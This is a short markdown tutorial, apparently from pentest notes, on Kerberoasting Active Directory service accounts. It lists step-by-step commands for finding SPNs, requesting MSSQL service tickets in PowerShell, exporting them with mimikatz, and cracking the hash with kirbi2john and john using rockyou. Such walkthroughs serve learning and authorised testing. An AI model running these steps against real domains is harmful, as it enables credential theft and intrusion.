# Service-Account-Attacks

A service account is a “non-human” account that is used to run services or applications. Service accounts are not administrative accounts, or other “human” accounts, used interactively by administrators or other employees. Service accounts also often have privileged access to computers, applications, and data, which makes them highly valuable to attackers.

## Extracting Service Account Passwords with Kerberoasting
Kerberoasting takes advantage of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs).

First we need to find the Service Principle names using [GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1).
```markdown
.\GetUserSPNs.ps1 
```

![OnPaste 20220612-182821](https://user-images.githubusercontent.com/106917304/173234405-a8881d5c-be62-4459-a799-0b4e41cc5170.png)


We will go for MSSQLSvc.

### Request Service Tickets for service account SPNs
```markdown
Add-Type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/x.y.com:1433" 
```

![OnPaste 20220612-183353](https://user-images.githubusercontent.com/106917304/173234596-52ce6d5a-d6ce-4ba3-81f6-07aa2594083d.png)


###  Extract Service Tickets Using Mimikatz
```markdown
.\mimikatz.exe 
privilege::debug 
kerberos::list /export 
```

![OnPaste 20220612-183717](https://user-images.githubusercontent.com/106917304/173234808-f56b6f91-08f6-489d-b83a-b64e940c6c8c.png)


![OnPaste 20220612-183857](https://user-images.githubusercontent.com/106917304/173234823-2d16862b-b0b9-4ea6-b5a5-c3c25bfefe6a.png)


We've successfully imported .kirbi files. Grab the MSSQL one, and download it to attacker machine.

### Crack the Tickets
We gonna use [kirbi2john.py](https://github.com/nidem/kerberoast) to get john hash and crack it using john.
```markdown
python3 kirbi2john.py -o hash mssql.kirbi 
```

![OnPaste 20220612-184621](https://user-images.githubusercontent.com/106917304/173235093-3de3a8f2-c18b-4358-868c-8062bc8a3d42.png)


![OnPaste 20220612-184727](https://user-images.githubusercontent.com/106917304/173235137-f9c5cce6-ca60-41fb-96d9-b66bef030cf5.png)

Now the hash is in john format. We can try to crack it.
```markdown
john hash --wordlist=/home/kali/Downloads/rockyou.txt 
john hash --show
```

![OnPaste 20220612-184954](https://user-images.githubusercontent.com/106917304/173235236-2eb3d49f-c6a7-43f5-9924-0ef857bda810.png)


